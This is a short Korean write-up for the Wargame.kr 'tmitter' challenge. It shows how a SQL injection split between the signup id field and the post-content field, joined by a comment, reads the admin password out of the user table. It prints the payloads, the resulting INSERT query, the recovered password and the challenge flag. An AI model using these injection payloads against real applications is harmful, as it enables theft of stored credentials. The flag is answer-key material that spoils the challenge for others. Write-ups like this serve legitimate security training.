# [Wargame.kr] tmitter - Writeup

## SQL Injection

가입과 로그인시에는 escape를 해서 SQL Injection가 통하지 않지만, 글을 쓸때에는 통한다.

고로 글을 쓸때 서브쿼리를 이용한 SQL Injection로 패스워드를 알아내면 됩니다.

```
INSERT INTO table(아이디,글,뭘까) VALUES('아이디','글','뭘까')
```

글을 쓸때는 위와 같은 `INSERT` 문을 쓸테니 싱글쿼터를 닫고 콤마(,)를 찍어주는게 포인트!


우선 `id`를 `',(select ps from tmitter_user/*` 로 가입한다.

(글자수 제한이 있으므로 주석을 이용해야한다.)


내용을 `*/where id='admin'),123)#`으로 글을 쓰면,

```
INSERT INTO table(아이디,글,뭘까) VALUES('',(select ps from tmitter_user/*','*/where id='admin'),123)#','뭘까')
```
위와 같은 형태로 쿼리가 형성된다.

```
{
    아이디 : 비어있음.

    글 : 서브쿼리로 인해 id가 'admin'인 유저의 패스워드가 출력.

    뭘까 : 대충 넣은 123.
}
```
이때 테이블에는 위와 같이 `INSERT` 된다.


결과적으로 인젝션이 성공해서 `iD0nTkn0wpassw0rd..!!`라고 admin 계정의 패스워드가 고스란히 출력된다.

위 패스워드로 로그인해보면 글 쓰는 텍스트 박스에 flag가 나온다.

___

## Answer

flag: `95a730da872ac03dc9dc7a04c7b0e65b808ce2b1`